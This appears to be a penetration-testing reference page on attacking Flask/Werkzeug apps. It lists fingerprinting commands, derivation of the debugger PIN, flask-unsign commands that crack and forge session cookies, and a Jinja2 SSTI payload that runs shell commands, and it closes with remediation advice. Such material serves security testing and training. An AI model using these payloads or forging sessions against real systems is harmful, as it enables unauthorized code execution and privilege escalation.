---
tags:
  - Web
---

# :material-flask: Flask / Werkzeug

<span class="pill pill-hard">debug console → RCE</span> <span class="pill pill-info">web</span>

Flask apps (on Werkzeug) leak two classic, high-impact issues: the **debug
console** (RCE) and **forgeable session cookies** (signed, not encrypted) — plus
Jinja2 SSTI.

!!! abstract "TL;DR"
    Look for the Werkzeug debugger (`/console`, error tracebacks) → RCE via the PIN
    (computable) → or crack/forge the `session` cookie secret → or Jinja2 SSTI
    (`{{7*7}}`).

## :material-magnify: Identify

```bash
curl -sI http://$TARGET | grep -i werkzeug          # Server: Werkzeug/x.x Python/x.x
# trigger an error to see the interactive traceback (debug=True)
curl -s "http://$TARGET/?x=%00" | grep -i traceback
```

## :material-fire: Werkzeug debugger → RCE

```text
# If debug=True, /console (or any traceback) exposes an interactive Python shell.
# It's PIN-locked, but the PIN is DETERMINISTIC — computed from:
#   username, modname, app name, machine-id (/etc/machine-id, /proc/self/cgroup),
#   and the MAC address. With an LFI to read those, you can regenerate the PIN.
# werkzeug-pin-exploit scripts automate this.
```

## :material-cookie: Session cookie forgery

Flask sessions are **signed with SECRET_KEY, not encrypted** — readable, and
forgeable if the key is weak/leaked:

```bash
flask-unsign --decode --cookie '<session-cookie>'         # read it
flask-unsign --unsign --cookie '<cookie>' --wordlist keys.txt   # crack the key
flask-unsign --sign --cookie "{'admin': True}" --secret 'leaked-key'   # forge
```

!!! loot "Weak SECRET_KEY = admin"
    A guessable/committed `SECRET_KEY` lets you forge any session (e.g. `admin=True`).
    Grep leaked source/repos for it → instant privilege escalation.

## :material-fire: Jinja2 SSTI

```text
{{7*7}}  → 49 confirms SSTI. Escalate to RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
Full payloads → [SSTI](../web/ssti.md).

## :material-shield-check: Remediation

- Never run `debug=True` in prod; strong random `SECRET_KEY` (never committed);
  autoescape templates; keep Werkzeug patched.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- SSTI → [SSTI](../web/ssti.md); leaked keys → [Credential Hunting](../privesc/credential-hunting.md).
- Reference: [flask-unsign](https://github.com/Paradoxis/Flask-Unsign), [HackTricks Flask](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/flask.html).
